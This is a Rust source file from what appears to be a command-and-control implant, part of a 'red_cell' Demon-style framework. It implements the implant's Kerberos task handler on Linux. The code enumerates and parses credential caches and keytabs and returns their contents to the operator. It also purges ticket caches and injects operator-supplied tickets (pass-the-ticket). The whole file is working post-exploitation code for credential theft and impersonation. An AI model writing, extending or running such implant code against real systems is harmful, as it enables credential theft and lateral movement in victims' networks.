//! `CommandKerberos` (ID 2550): Linux Kerberos operations.

use std::fs;

use red_cell_common::demon::DemonKerberosCommand;

use crate::error::PhantomError;
use crate::parser::TaskParser;

use super::encode::*;
use super::types::PendingCallback;
use super::PhantomState;

/// Handle `CommandKerberos` (ID 2550): Linux Kerberos operations.
///
/// Payload layout (little-endian):
/// ```text
/// i32  subcommand — DemonKerberosCommand (0=Luid, 1=Klist, 2=Purge, 3=Ptt)
/// ```
///
/// Subcommand-specific trailing fields:
/// - **Klist** `i32 mode` (0 = all, 1 = by-luid) + optional `i32 luid`
/// - **Purge** (no extra fields — purges all ccache files)
/// - **Ptt**   `bytes ticket_data` (length-prefixed) + `bytes principal` (length-prefixed)
pub(super) fn execute_kerberos(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    use crate::kerberos;

    let mut parser = TaskParser::new(payload);
    let sub_raw = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative kerberos subcommand"))?;
    let sub = DemonKerberosCommand::try_from(sub_raw)
        .map_err(|_| PhantomError::TaskParse("unknown kerberos subcommand"))?;

    match sub {
        DemonKerberosCommand::Luid => {
            // Linux has no LUID — return the current UID instead.
            let uid = unsafe { libc::getuid() };
            state.queue_callback(PendingCallback::Output {
                request_id,
                text: format!("Current UID: {uid} (Linux equivalent of LUID)"),
            });
        }
        DemonKerberosCommand::Klist => {
            // Enumerate ccache files and keytab entries.
            let ccache_paths = kerberos::resolve_ccache_paths();
            let mut ccaches = Vec::new();
            for path in &ccache_paths {
                if let Ok(data) = fs::read(path) {
                    match kerberos::parse_ccache(&data, &path.display().to_string()) {
                        Ok(cc) => ccaches.push(cc),
                        Err(e) => {
                            tracing::warn!(path = %path.display(), error = %e, "failed to parse ccache");
                        }
                    }
                }
            }

            let keytab_paths = kerberos::resolve_keytab_paths();
            let mut keytabs = Vec::new();
            for path in &keytab_paths {
                if let Ok(data) = fs::read(path) {
                    match kerberos::parse_keytab(&data, &path.display().to_string()) {
                        Ok(kt) => keytabs.push(kt),
                        Err(e) => {
                            tracing::warn!(path = %path.display(), error = %e, "failed to parse keytab");
                        }
                    }
                }
            }

            let mut output = kerberos::format_klist(&ccaches);
            let kt_output = kerberos::format_keytabs(&keytabs);
            if !kt_output.is_empty() {
                output.push_str(&kt_output);
            }

            state.queue_callback(PendingCallback::Output { request_id, text: output });
        }
        DemonKerberosCommand::Purge => {
            let result = kerberos::purge_ccache_files();
            state.queue_callback(PendingCallback::Output { request_id, text: result });
        }
        DemonKerberosCommand::Ptt => {
            // Payload: length-prefixed ticket bytes, then length-prefixed principal string.
            let ticket_data = parser.bytes()?;
            let principal = parser.string()?;

            match kerberos::inject_ticket(ticket_data, &principal) {
                Ok(msg) => state.queue_callback(PendingCallback::Output { request_id, text: msg }),
                Err(e) => state.queue_callback(PendingCallback::Error {
                    request_id,
                    text: format!("PTT failed: {e}"),
                }),
            }
        }
    }

    Ok(())
}
